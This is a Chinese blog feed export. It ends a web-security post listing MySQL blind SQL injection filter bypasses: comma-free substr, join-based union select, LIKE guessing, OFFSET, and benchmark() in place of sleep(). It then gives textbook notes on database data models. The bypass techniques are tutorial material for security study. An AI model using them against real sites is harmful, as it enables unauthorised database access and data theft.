<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> substr(&quot;string&quot; <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">3</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+</span></span><br><span class="line"><span class="operator">|</span> substr(&quot;string&quot; <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">3</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+</span></span><br><span class="line"><span class="operator">|</span> str                           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<p>在sql盲注中，如果过滤逗号，以下参考下面的写法绕过</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">mysql&gt; select ascii(substr(database() from 1 for 1)) &gt; 120;</span><br><span class="line"><span class="code">+----------------------------------------------+</span></span><br><span class="line">| ascii(substr(database() from 1 for 1)) &gt; 120 |</span><br><span class="line"><span class="code">+----------------------------------------------+</span></span><br><span class="line">|                                            0 |</span><br><span class="line"><span class="code">+----------------------------------------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select ascii(substr(database() from 1 for 1)) &gt; 110;</span><br><span class="line"><span class="code">+----------------------------------------------+</span></span><br><span class="line">| ascii(substr(database() from 1 for 1)) &gt; 110 |</span><br><span class="line"><span class="code">+----------------------------------------------+</span></span><br><span class="line">|                                            1 |</span><br><span class="line"><span class="code">+----------------------------------------------+</span></span><br></pre></td></tr></table></figure>
<ul>
<li>也可使用<code>join</code>关键字来绕过</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users  <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b <span class="keyword">join</span>(<span class="keyword">select</span> <span class="number">3</span>)c;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> user2    <span class="operator">|</span> pass1    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> test3    <span class="operator">|</span> pass1    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> <span class="number">2</span>        <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure>
<p>其中的</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b <span class="keyword">join</span>(<span class="keyword">select</span> <span class="number">3</span>)c</span><br></pre></td></tr></table></figure>
<p>等价于</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>
<ul>
<li>使用<code>like</code>关键字<br>适用于<code>substr()</code>等提取子串的函数中的逗号</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> ascii(substr(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">114</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+</span></span><br><span class="line"><span class="operator">|</span> ascii(substr(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">114</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                             <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">like</span> &quot;r%&quot;;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">user</span>() <span class="keyword">like</span> &quot;r%&quot; <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span>                <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">like</span> &quot;t%&quot;;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">user</span>() <span class="keyword">like</span> &quot;t%&quot; <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span>                <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br></pre></td></tr></table></figure>
<ul>
<li>使用offset关键字<br>适用于<code>limit</code>中的逗号被过滤的情况<br><code>limit 2,1</code>等价于<code>limit 1 offset 2</code></li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users limit <span class="number">2</span>,<span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> test3    <span class="operator">|</span> pass1    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">2</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> test3    <span class="operator">|</span> pass1    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure>
<h1 id="过滤函数绕过"><a href="#过滤函数绕过" class="headerlink" title="过滤函数绕过"></a>过滤函数绕过</h1><ul>
<li>sleep() –&gt;benchmark()</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="number">12</span>,<span class="number">23</span> <span class="keyword">and</span> sleep(<span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----+-----------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">12</span> <span class="operator">|</span> <span class="number">23</span> <span class="keyword">and</span> sleep(<span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-----------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">12</span> <span class="operator">|</span>               <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-----------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">1.00</span> sec)</span><br><span class="line"></span><br><span class="line"># MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。 </span><br><span class="line">参数可以是需要执行的次数和表达式。第一个参数是执行次数，第二个执行的表达式</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="number">12</span>,<span class="number">23</span> <span class="keyword">and</span> benchmark(<span class="number">1000000000</span>,<span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">12</span> <span class="operator">|</span> <span class="number">23</span> <span class="keyword">and</span> benchmark(<span class="number">1000000000</span>,<span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">12</span> <span class="operator">|</span>                              <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">4.61</span> sec)</span><br></pre></td></tr></table></figure>
<ul>
<li>ascii()–&gt;hex()、bin()<br>替代之后再使用对应的进制转string即可</li>
<li>group_concat()–&gt;concat_ws()</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> group_concat(&quot;str1&quot;,&quot;str2&quot;);</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------+</span></span><br><span class="line"><span class="operator">|</span> group_concat(&quot;str1&quot;,&quot;str2&quot;) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------+</span></span><br><span class="line"><span class="operator">|</span> str1str2                    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">#第一个参数为分隔符</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> concat_ws(&quot;,&quot;,&quot;str1&quot;,&quot;str2&quot;);</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------+</span></span><br><span class="line"><span class="operator">|</span> concat_ws(&quot;,&quot;,&quot;str1&quot;,&quot;str2&quot;) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------+</span></span><br><span class="line"><span class="operator">|</span> str1,str2                    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------+</span></span><br></pre></td></tr></table></figure>
<ul>
<li>substr(),substring(),mid()可以相互取代, 取子串的函数还有left(),right()</li>
<li>user() –&gt; @@user、datadir–&gt;@@datadir</li>
<li>ord()–&gt;ascii():这两个函数在处理英文时效果一样，但是处理中文等时不一致。</li>
</ul>
]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title>《数据库系统概论》第一章绪论</title>
    <url>/2021/03/02/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E7%AC%AC%E4%B8%80%E7%AB%A0%E7%BB%AA%E8%AE%BA/</url>
    <content><![CDATA[<p>《数据库系统概论》第一章绪论</p>
<a id="more"></a>

<h1 id="数据模型"><a href="#数据模型" class="headerlink" title="数据模型"></a>数据模型</h1><p> <strong>思维导图</strong></p>
<p><img src="https://img.npfs06.top/20210302150456.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="四大基本概念"><a href="#四大基本概念" class="headerlink" title="四大基本概念"></a>四大基本概念</h2><h3 id="数据–Data"><a href="#数据–Data" class="headerlink" title="数据–Data"></a>数据–Data</h3><p>数据(Data)是数据库中存储的基本对象</p>
<h4 id="数据的定义"><a href="#数据的定义" class="headerlink" title="数据的定义"></a>数据的定义</h4><p>描述事物的符号记录</p>
<h4 id="数据的种类"><a href="#数据的种类" class="headerlink" title="数据的种类"></a>数据的种类</h4><p>文本、图形、图像、音频、视频、学生的档案记录、货物的运输情况等</p>
<h4 id="数据的特点"><a href="#数据的特点" class="headerlink" title="数据的特点"></a>数据的特点</h4><p>数据与其语义是不可分的</p>
<h4 id="数据举例"><a href="#数据举例" class="headerlink" title="数据举例"></a>数据举例</h4><p>数据的含义称为数据的语义，数据与其语义是不可分的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如 93是一个数据</span><br><span class="line">语义1：学生某门课的成绩</span><br><span class="line">语义2：某人的体重</span><br><span class="line">语义3：计算机系2003级学生人数</span><br><span class="line">语义4：请同学给出。。。</span><br><span class="line"></span><br><span class="line">例如 学生档案中的学生记录</span><br><span class="line">（李明，男，197205，江苏南京市，计算机系，1990）</span><br><span class="line">语义：学生姓名、性别、出生年月、籍贯、所在院系、</span><br><span class="line">入学时间</span><br><span class="line">解释：李明是个大学生，1972年5月出生，江苏南京市人，1990年考入计算机系</span><br></pre></td></tr></table></figure>
<h3 id="数据库–Database"><a href="#数据库–Database" class="headerlink" title="数据库–Database"></a>数据库–Database</h3><h4 id="数据库的定义"><a href="#数据库的定义" class="headerlink" title="数据库的定义"></a>数据库的定义</h4><p>数据库(Database,简称DB)是<code>长期储存</code>在<code>计算机内</code>、<code>有组织</code>、<code>可共享</code>的大量<code>数据</code>的<code>集合</code>。</p>
<h4 id="数据库的基本特征"><a href="#数据库的基本特征" class="headerlink" title="数据库的基本特征"></a>数据库的基本特征</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数据按一定的数据模型组织、描述和储存</span><br><span class="line">可为各种用户共享</span><br><span class="line">冗余度较小</span><br><span class="line">数据独立性较高</span><br><span class="line">易扩展</span><br></pre></td></tr></table></figure>
<h3 id="数据库管理系统–DataBase-Management-System"><a href="#数据库管理系统–DataBase-Management-System" class="headerlink" title="数据库管理系统–DataBase Management System"></a>数据库管理系统–DataBase Management System</h3><h4 id="什么是DBMS"><a href="#什么是DBMS" class="headerlink" title="什么是DBMS?"></a>什么是DBMS?</h4><p>DBMS是位于用户与操作系统之间的一层<code>数据管理软件</code>。是基础软件，是一个大型复杂的软件系统</p>
<h4 id="DBMS的用途"><a href="#DBMS的用途" class="headerlink" title="DBMS的用途"></a>DBMS的用途</h4><p>科学地组织和存储数据、高效地获取和维护数据</p>
<h4 id="DBMS的主要功能"><a href="#DBMS的主要功能" class="headerlink" title="DBMS的主要功能"></a>DBMS的主要功能</h4><ul>
<li><code>数据定义功能</code><br>提供数据定义语言(DDL)<br>定义数据库中的数据对象</li>
<li><code>数据组织、存储和管理</code><br>分类组织、存储和管理各种数据<br>确定组织数据的文件结构和存取方式<br>实现数据之间的联系<br>提供多种存取方法提高存取效率</li>
<li><code>数据操纵功能</code><br>提供数据操纵语言(DML)<br>实现对数据库的基本操作 (查询、插入、删除和修改)</li>
<li><code>数据库的事务管理和运行管理</code><br>数据库在建立、运行和维护时由DBMS统一管理和控制<br>保证数据的安全性、完整性、多用户对数据的并发使用<br>发生故障后的系统恢复</li>
<li><code>数据库的建立和维护功能(实用程序)</code><br>数据库初始数据装载转换<br>数据库转储<br>介质故障恢复<br>数据库的重组织<br>性能监视分析等</li>
<li><code>其它功能</code><br>DBMS与网络中其它软件系统的通信<br>两个DBMS系统的数据转换<br>异构数据库之间的互访和互操作</li>
</ul>
<h3 id="数据库系统–Database-System"><a href="#数据库系统–Database-System" class="headerlink" title="数据库系统–Database System"></a>数据库系统–Database System</h3><h4 id="什么是数据库系统（Database-System，简称DBS）"><a href="#什么是数据库系统（Database-System，简称DBS）" class="headerlink" title="什么是数据库系统（Database System，简称DBS）"></a>什么是数据库系统（Database System，简称DBS）</h4><p>在计算机系统中引入数据库后的系统构成</p>
<h4 id="数据库系统的构成"><a href="#数据库系统的构成" class="headerlink" title="数据库系统的构成"></a>数据库系统的构成</h4><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">数据库 <span class="keyword">Database</span></span><br><span class="line">数据库管理系统（及其开发工具）<span class="keyword">Database</span> Management <span class="keyword">System</span></span><br><span class="line">应用系统</span><br><span class="line">数据库管理员 <span class="keyword">Database</span> Administrator</span><br></pre></td></tr></table></figure>
<p><img src="https://img.npfs06.top/20210302150518.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h4 id="数据库系统的特点"><a href="#数据库系统的特点" class="headerlink" title="数据库系统的特点"></a>数据库系统的特点</h4><p><strong>1.数据结构化</strong></p>
<ul>
<li><code>整体数据的结构化</code>是数据库的主要特征之一</li>
<li><code>整体结构化</code><br>不再仅仅针对某一个应用，而是面向全组织<br>不仅数据内部结构化，整体是结构化的，数据之间具有联系</li>
<li><code>数据库中实现的是数据的真正结构化</code><br>数据的结构用<code>数据模型</code>描述，无需程序定义和解释<br>数据可以<code>变长</code><br>数据的最小存取单位是<code>数据项</code></li>
</ul>
<p><strong>2.数据的共享性高，冗余度低，易扩充</strong></p>
<ul>
<li>数据库系统从整体角度看待和描述数据，数据面向整个系统，可以被多个用户、多个应用共享使用。</li>
<li><code>数据共享的好处</code><br>减少数据冗余，节约存储空间<br>避免数据之间的不相容性与不一致性<br>使系统易于扩充</li>
</ul>
<p><strong>3.数据独立性高</strong></p>
<ul>
<li><code>物理独立性</code><br>指用户的应用程序与存储在磁盘上的数据库中数据是相互独立的。当数据的物理存储改变了，应用程序不用改变。</li>
<li><code>逻辑独立性</code><br>指用户的应用程序与数据库的逻辑结构是相互独立的。数据的逻辑结构改变了，用户程序也可以不变。</li>
<li>数据独立性是由DBMS的二级映像功能来保证的</li>
</ul>
<p><strong>4.数据由DBMS统一管理和控制</strong></p>
<p><strong>DBMS提供的数据控制功能</strong></p>
<ul>
<li>数据的安全性（Security）保护·<br>保护数据，以防止不合法的使用造成的数据的泄密和破坏。</li>
<li>数据的完整性（Integrity）检查<br>  将数据控制在有效的范围内，或保证数据之间满足一定的关系。</li>
<li>并发（Concurrency）控制<br>  对多用户的并发操作加以控制和协调，防止相互干扰而得到错误的结果。</li>
<li>数据库恢复（Recovery）<br>  将数据库从错误状态恢复到某一已知的正确状态。</li>
</ul>
<p><strong>5.应用程序与数据的对应关系(数据库系统)</strong></p>
<p><img src="https://img.npfs06.top/20210302150532.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="数据管理技术的产生和发展"><a href="#数据管理技术的产生和发展" class="headerlink" title="数据管理技术的产生和发展"></a>数据管理技术的产生和发展</h2><h3 id="什么是数据管理"><a href="#什么是数据管理" class="headerlink" title="什么是数据管理"></a>什么是数据管理</h3><ul>
<li>对数据进行分类、组织、编码、存储、检索和维护</li>
<li>数据处理的中心问题</li>
</ul>
<h3 id="数据管理技术的发展过程"><a href="#数据管理技术的发展过程" class="headerlink" title="数据管理技术的发展过程"></a>数据管理技术的发展过程</h3><ul>
<li>人工管理阶段(20世纪40年代中–50年代中)</li>
<li>文件系统阶段(20世纪50年代末–60年代中)</li>
<li>数据库系统阶段(20世纪60年代末–现在)</li>
</ul>
<h3 id="时期"><a href="#时期" class="headerlink" title="时期"></a>时期</h3><ul>
<li>20世纪60年代末以来</li>
</ul>
<h3 id="产生的背景"><a href="#产生的背景" class="headerlink" title="产生的背景"></a>产生的背景</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">应用背景 大规模管理</span><br><span class="line">硬件背景 大容量磁盘、磁盘阵列</span><br><span class="line">软件背景 有数据库管理系统</span><br><span class="line">处理方式 联机实时处理,分布处理,批处理</span><br></pre></td></tr></table></figure>



<h1 id="数据模型-1"><a href="#数据模型-1" class="headerlink" title="数据模型"></a>数据模型</h1><p><strong>思维导图</strong></p>
<p><img src="https://img.npfs06.top/20210302150544.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="数据模型的概念"><a href="#数据模型的概念" class="headerlink" title="数据模型的概念"></a>数据模型的概念</h2><ul>
<li>在数据库中用数据模型这个工具来<code>抽象、表示和处理</code>现实世界中的数据和信息。</li>
<li>通俗地讲数据模型就是<code>现实世界的模拟</code>。</li>
</ul>
<p><strong>数据模型应满足三方面要求：</strong></p>
<ul>
<li>能比较<code>真实</code>地模拟现实世界</li>
<li><code>容易</code>为人所<code>理解</code></li>
<li>便于在计算机上<code>实现</code></li>
</ul>
<h2 id="两大类数据模型"><a href="#两大类数据模型" class="headerlink" title="两大类数据模型"></a>两大类数据模型</h2><p><strong>数据模型分为两类（分属两个不同的层次）</strong></p>
<ul>
<li>(1) <code>概念模型 也称信息模型</code>，它是按<code>用户的观点</code>来对数据和信息建模，用于数据库设计。</li>
<li>(2) <code>逻辑模型</code>和<code>物理模型</code><br><strong>逻辑模型</strong>主要包括<code>网状模型</code>、<code>层次模型</code>、<code>关系模型</code>、<code>面向对象模型</code>等，按<code>计算机系统的观点</code>对数据建模，用于DBMS实现。<br><strong>物理模型</strong>是对数据最底层的抽象，描述数据在系统内部的表示方式和存取方法，在磁盘或磁带上的存储方式和存取方法。</li>
</ul>
<h3 id="客观对象的抽象过程—两步抽象"><a href="#客观对象的抽象过程—两步抽象" class="headerlink" title="客观对象的抽象过程—两步抽象"></a>客观对象的抽象过程—两步抽象</h3><ul>
<li>现实世界中的客观对象抽象为<code>概念模型</code>；</li>
<li>把<code>概念模型</code>转换为某一DBMS支持的<code>数据模型</code>。<br><img src="https://img.npfs06.top/20210302150604.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></li>
</ul>
<h2 id="数据模型的组成要素"><a href="#数据模型的组成要素" class="headerlink" title="数据模型的组成要素"></a>数据模型的组成要素</h2><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><p><strong>数据结构是所研究的对象类型的集合</strong>。这些对象是数据库的组成成分，数据结构指对象和对象间联系的表达和实现，是对系统静态特征的描述，包括两个方面：<br>（1）数据本身：类型、内容、性质。例如关系模型中的域、属性、关系等。<br>（2）数据之间的联系：数据之间是如何相互关联的，例如关系模型中的主码、外码联系等。</p>
<h3 id="数据操作"><a href="#数据操作" class="headerlink" title="数据操作"></a>数据操作</h3><p><strong>数据操作</strong></p>
<ul>
<li>对数据库中各种<code>对象(型)</code>的<code>实例(值)</code>允许执行的<code>操作</code>，及有关的<code>操作规则</code></li>
</ul>
<p><strong>数据操作的类型</strong></p>
<ul>
<li>查询</li>
<li>更新(包括插入、删除、修改)</li>
</ul>
<h3 id="数据的完整性约束条件"><a href="#数据的完整性约束条件" class="headerlink" title="数据的完整性约束条件"></a>数据的完整性约束条件</h3><ul>
<li><strong>数据的完整性约束条件</strong>是一组<code>完整性规则</code>的集合，规定数据库状态及状态变化所应满足的条件，以保证数据的正确性、有效性和相容性。</li>
</ul>
<blockquote>
<p>完整性规则：给定的数据模型中数据及其联系所具有的制约和储存规则</p>
</blockquote>
<h2 id="概念模型"><a href="#概念模型" class="headerlink" title="概念模型"></a>概念模型</h2><h3 id="用途与基本要求"><a href="#用途与基本要求" class="headerlink" title="用途与基本要求"></a>用途与基本要求</h3><p><strong>概念模型的用途:</strong></p>
<ul>
<li>概念模型用于信息世界的建模</li>
<li>是现实世界到机器世界的一个中间层次</li>
<li>是数据库设计的有力工具</li>
<li>数据库设计人员和用户之间进行交流的语言</li>
</ul>
<p><strong>对概念模型的基本要求:</strong></p>
<ul>
<li>较强的语义表达能力</li>
<li>能够方便、直接地表达应用中的各种语义知识</li>
<li>简单、清晰、易于用户理解</li>
</ul>
<h3 id="信息世界中的基本概念"><a href="#信息世界中的基本概念" class="headerlink" title="信息世界中的基本概念"></a>信息世界中的基本概念</h3><ul>
<li>(1) <code>实体</code>（Entity）<br><code>客观存在并可相互区别的事物</code>称为实体。<br>可以是具体的人、事、物或抽象的概念。</li>
<li>(2) <code>属性</code>（Attribute）<br><code>实体</code>所具有的某一<code>特性</code>称为属性。<br>一个实体可以由若干个属性来刻画。</li>
<li>(3) <code>码</code>（Key）<br><code>唯一标识实体的属性</code>集称为码。<br>(4) <code>域</code>（Domain）<br><code>属性</code>的<code>取值范围</code>称为该属性的域。</li>
<li>(5) <code>实体型</code>（Entity Type）<br>用<code>实体名</code>及其<code>属性名集合</code>来抽象和刻画<code>同类实体</code>称为实体型</li>
<li>(6) <code>实体集</code>（Entity Set）<br><code>同一类型实体的集合</code>称为实体集</li>
<li>(7) <code> 联系</code>（Relationship）<ul>
<li>现实世界中<code>事物内部</code>以及<code>事物之间</code>的<code>联系</code>在信息世界中反映为实体内部的联系和实体之间的联系。</li>
<li>实体<code>内部的联系</code>通常是指组成实体的<code>各属性之间</code>的联系</li>
<li>实体<code>之间的联系</code>通常是指<code>不同实体集之间</code>的联系</li>
</ul>
</li>
</ul>
<h3 id="两个实体型之间的联系"><a href="#两个实体型之间的联系" class="headerlink" title="两个实体型之间的联系"></a>两个实体型之间的联系</h3><p><img src="https://img.npfs06.top/20210302150620.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h4 id="一对一联系（1-1）"><a href="#一对一联系（1-1）" class="headerlink" title="一对一联系（1:1）"></a>一对一联系（1:1）</h4><p><strong>实例</strong></p>
<ul>
<li>一个班级只有一个正班长</li>
<li>一个班长只在一个班中任职<br><img src="https://img.npfs06.top/20210302150637.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></li>
</ul>
<p><strong>定义：</strong><br>如果对于实体集A中的每一个实体，实体集B中至多有一个（也可以没有）实体与之联系，反之亦然。则称实体集A与实体集B具有一对一联系，记为1:1</p>
<h4 id="一对多联系（1-n）"><a href="#一对多联系（1-n）" class="headerlink" title="一对多联系（1:n）"></a>一对多联系（1:n）</h4><p><strong>实例</strong></p>
<ul>
<li>一个班级中有若干名学生，</li>
<li>每个学生只在一个班级中学习<br><img src="https://img.npfs06.top/20210302150653.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><br><strong>定义：</strong><br>如果对于实体集A中的每一个实体，实体集B中有n个实体（n≥0）与之联系，反之，对于实体集B中的每一个实体，实体集A中至多只有一个实体与之联系，则称实体集A与实体集B有一对多联系，记为1:n</li>
</ul>
<h4 id="多对多联系（m-n）"><a href="#多对多联系（m-n）" class="headerlink" title="多对多联系（m:n）"></a>多对多联系（m:n）</h4><p><strong>实例</strong></p>
<ul>
<li>课程与学生之间的联系：</li>
<li>一门课程同时有若干个学生选修</li>
<li>一个学生可以同时选修多门课程<br><img src="https://img.npfs06.top/20210302150708.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"><br><strong>定义：</strong><br>如果对于实体集A中的每一个实体，实体集B中有n个实体（n≥0）与之联系，反之，对于实体集B中的每一个实体，实体集A中也有m个实体（m≥0）与之联系，则称实体集A与实体B具有多对多联系，记为m:n</li>
</ul>
<h3 id="两个以上实体型之间的联系"><a href="#两个以上实体型之间的联系" class="headerlink" title="两个以上实体型之间的联系"></a>两个以上实体型之间的联系</h3><h4 id="一对多联系（1-m-1-n）"><a href="#一对多联系（1-m-1-n）" class="headerlink" title="一对多联系（1:m||1:n）"></a>一对多联系（1:m||1:n）</h4><ul>
<li>若实体集E1，E2，…，En存在联系，对于实体集Ej（j=1，2，…，i-1i+1，…，n）中的给定实体，最多只和Ei中的一个实体相联系，则我们说Ei与E1E2，…，Ei-1，Ei+1，…，En之间的联系是一对多的。</li>
</ul>
<p><strong>实例</strong></p>
<ul>
<li>课程、教师与参考书三个实体型<br>一门课程可以有若干个教师讲授，<br>使用若干本参考书，<br>每一个教师只讲授一门课程，<br>每一本参考书只供一门课程使用</li>
</ul>
